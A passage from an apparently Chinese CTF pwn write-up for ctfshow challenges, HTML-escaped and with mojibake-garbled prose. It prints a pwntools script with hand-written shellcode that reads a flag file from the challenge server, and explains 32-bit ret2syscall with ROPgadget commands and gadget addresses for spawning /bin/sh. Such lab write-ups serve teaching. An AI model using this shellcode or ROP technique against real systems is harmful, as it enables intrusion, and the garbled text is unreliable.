&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;æ‰‹å†™æ±‡ç¼–çš„expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#coding:utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28114&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;//è°ƒç”¨open()
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;push 0
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;//ç»•è¿‡strlen()æ£€æŸ¥
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov r15, 0x67616c66
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;push r15
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov rdi, rsp
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov rsi, 0
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov rax, 2
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;syscall
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;//è°ƒç”¨read()
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov r14, 3
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov rdi, r14
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov rsi, rsp
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov rdx, 0xff
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov rax, 0
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;syscall
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;//è°ƒç”¨write()
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov rdi,1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov rsi, rsp
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov rdx, 0xff
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov rax, 1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;syscall
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;å»ºè®®å¤§å®¶åœ¨ä»¥åè¦å¤šå­¦å­¦æ±‡ç¼–è¯­è¨€ï¼Œæœ‰æ—¶å€™æ‰‹æ•²æ˜¯çœŸçš„å®ç”¨ï¼Œå¥½ç†è§£ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ret2syscall&#34;&gt;&lt;strong&gt;ret2syscall&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;ret2syscallçš„æ ¸å¿ƒæ€æƒ³æ˜¯é€šè¿‡æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œä½¿ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼ˆsyscallï¼‰æŒ‡ä»¤æ¥è·å–ç³»ç»Ÿèµ„æºæˆ–æ‰§è¡Œç‰¹å®šæ“ä½œã€‚ç³»ç»Ÿè°ƒç”¨æ˜¯æ“ä½œç³»ç»Ÿæä¾›ç»™ç”¨æˆ·ç¨‹åºçš„æ¥å£ï¼Œç”¨äºè¯·æ±‚å†…æ ¸æœåŠ¡ã€‚ä¾‹å¦‚ï¼Œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œexecveç³»ç»Ÿè°ƒç”¨å¯ä»¥ç”¨æ¥å¯åŠ¨ä¸€ä¸ªæ–°çš„ç¨‹åºï¼ˆå¦‚/bin/shï¼‰ï¼Œä»è€Œè·å–shellã€‚&lt;/p&gt;
&lt;p&gt;ret2syscall æ˜¯é€šè¿‡ &lt;strong&gt;æ‹¼æ¥ç¨‹åºä¸­çš„ gadgetï¼ˆæŒ‡ä»¤ç‰‡æ®µï¼‰&lt;/strong&gt;ï¼Œæ‰‹åŠ¨è®¾ç½®ç³»ç»Ÿè°ƒç”¨æ‰€éœ€çš„å¯„å­˜å™¨å€¼ï¼Œæœ€ç»ˆè§¦å‘ &lt;code&gt;int 0x80&lt;/code&gt;ï¼ˆ32 ä½ Linux ç³»ç»Ÿè°ƒç”¨å…¥å£ï¼‰æ¥æ‰§è¡Œå‘½ä»¤çš„æ”»å‡»æ–¹æ³•ã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;1.åœ¨32ä½Linuxç³»ç»Ÿä¸­ï¼Œç³»ç»Ÿè°ƒç”¨é€šè¿‡int 0x80æŒ‡ä»¤è§¦å‘ï¼Œéœ€è¦è®¾ç½®ä»¥ä¸‹å¯„å­˜å™¨ï¼š&lt;/p&gt;
&lt;p&gt;eaxï¼šç³»ç»Ÿè°ƒç”¨å·ï¼ˆä¾‹å¦‚ï¼Œexecveçš„è°ƒç”¨å·ä¸º0xbï¼‰&lt;/p&gt;
&lt;p&gt;ebxï¼šç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆä¾‹å¦‚ï¼Œ/bin/shçš„åœ°å€ï¼‰&lt;/p&gt;
&lt;p&gt;ecxï¼šç¬¬äºŒä¸ªå‚æ•°ï¼ˆé€šå¸¸ä¸º0ï¼‰&lt;/p&gt;
&lt;p&gt;edxï¼šç¬¬ä¸‰ä¸ªå‚æ•°ï¼ˆé€šå¸¸ä¸º0ï¼‰&lt;/p&gt;
&lt;p&gt;2.åœ¨64ä½ç³»ç»Ÿä¸­ï¼Œç³»ç»Ÿè°ƒç”¨é€šè¿‡syscallæŒ‡ä»¤è§¦å‘ï¼Œå¯„å­˜å™¨åˆ†é…æœ‰æ‰€ä¸åŒï¼š&lt;/p&gt;
&lt;p&gt;raxï¼šç³»ç»Ÿè°ƒç”¨å·ï¼ˆä¾‹å¦‚ï¼Œexecveçš„è°ƒç”¨å·ä¸º0x3bï¼‰&lt;/p&gt;
&lt;p&gt;rdiï¼šç¬¬ä¸€ä¸ªå‚æ•°&lt;/p&gt;
&lt;p&gt;rsiï¼šç¬¬äºŒä¸ªå‚æ•°&lt;/p&gt;
&lt;p&gt;rdxï¼šç¬¬ä¸‰ä¸ªå‚æ•°&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;pwn_071&#34;&gt;PWN_071
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š32ä½çš„ret2syscallã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_071&#34; &gt;PWN_071&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/253.png&#34;
	width=&#34;705&#34;
	height=&#34;200&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/253_hu_64035e311317f69c.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/253_hu_6f12b5aec5e8a08a.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;352&#34;
		data-flex-basis=&#34;846px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;32ä½å…³é—­æ ˆä¿æŠ¤ä¸PIEã€‚&lt;/p&gt;
&lt;p&gt;IDA32ä½åˆ†æï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/254.png&#34;
	width=&#34;389&#34;
	height=&#34;539&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/254_hu_347977e041ff3715.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/254_hu_dfc2988a7dd696b0.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;é™æ€ç¼–è¯‘&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;72&#34;
		data-flex-basis=&#34;173px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/255.png&#34;
	width=&#34;686&#34;
	height=&#34;224&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/255_hu_bad0c869421ae208.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/255_hu_63c4f54e6c6a9801.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;306&#34;
		data-flex-basis=&#34;735px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æœ‰æ˜æ˜¾æ ˆæº¢å‡ºæ¼æ´ã€&lt;code&gt;getså‡½æ•°&lt;/code&gt;ï¼›é¢˜ç›®æè¿°ä»¥åŠå„å¤„éƒ½æç¤ºäº†è®©ç”¨ret2syscallæ¥è¿›è¡Œæ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¨‹åºä¸­çš„ gadgets æ¥è·å¾—shellï¼Œè€Œå¯¹åº”çš„ shell è·å–åˆ™æ˜¯åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨ã€‚&lt;/p&gt;
&lt;p&gt;å¤§è‡´æ€è·¯æ˜¯å…ˆæ ˆæº¢å‡ºå¡«å……ç¼“å†²åŒºï¼Œåˆ©ç”¨gadgetsè°ƒç”¨syscallï¼Œä¹Ÿå°±æ˜¯ä¼ é€’å®ƒçš„è°ƒç”¨å·&lt;code&gt;0xb&lt;/code&gt;ï¼Œç”¨raxå¯„å­˜å™¨ä¼ é€’ï¼Œç„¶åè°ƒç”¨execveå‡½æ•°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;execve&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;,NULL,NULL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;éœ€è¦ç”¨åˆ°eaxç³»ç»Ÿè°ƒç”¨å‚æ•°ä¼ é€’çš„å¯„å­˜å™¨çš„gadgetï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ROPgadget --binary pwn --only &lt;span class=&#34;s2&#34;&gt;&amp;#34;pop|ret&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep eax
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/263.png&#34;
	width=&#34;1255&#34;
	height=&#34;171&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/263_hu_326ee45a78f9d319.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/263_hu_d53916b8141aa5b2.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;pop_eax_ret:0x080bb196&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;733&#34;
		data-flex-basis=&#34;1761px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;execveå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œ32ä½æ¶æ„é æ ˆä¼ é€’å‚æ•°ï¼Œæ‰€ä»¥è¦æœ‰å‚æ•°å¯„å­˜å™¨ï¼š&lt;code&gt;ebx&lt;/code&gt;ï¼ˆç¬¬ 1 å‚ï¼‰ã€&lt;code&gt;ecx&lt;/code&gt;ï¼ˆç¬¬ 2 å‚ï¼‰ã€&lt;code&gt;edx&lt;/code&gt;ï¼ˆç¬¬ 3 å‚ï¼‰ï¼Œä¹Ÿå°±æ˜¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ROPgadget --binary pwn --only &lt;span class=&#34;s2&#34;&gt;&amp;#34;pop|ret&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep ebx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;åŒç†ï¼Œint 0x80è°ƒç”¨å·çš„gadgetåœ°å€äº¦æ˜¯å¦‚æ­¤ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/269.png&#34;
	width=&#34;1381&#34;
	height=&#34;351&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/269_hu_24a61b0f2e8ca09a.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/269_hu_e8d841aa604d322b.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;int_0x80:0x08049421&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;393&#34;
		data-flex-basis=&#34;944px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/264.png&#34;
	width=&#34;1219&#34;
	height=&#34;236&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/264_hu_d49a61625bac63d0.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/264_hu_b65b203022f2e0fd.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;pop_edx_ecx_ebx_ret:0x0806eb90&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;516&#34;
		data-flex-basis=&#34;1239px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;/bin/shçš„åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/265.png&#34;
	width=&#34;1333&#34;
	height=&#34;465&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/265_hu_4cef6958caeafb9c.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/265_hu_d16ab7ba28a6252d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;binsh:0x80BE408&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;286&#34;
		data-flex-basis=&#34;688px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;åŒç†int 0x80&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¥ä¸ºçš„exp&amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
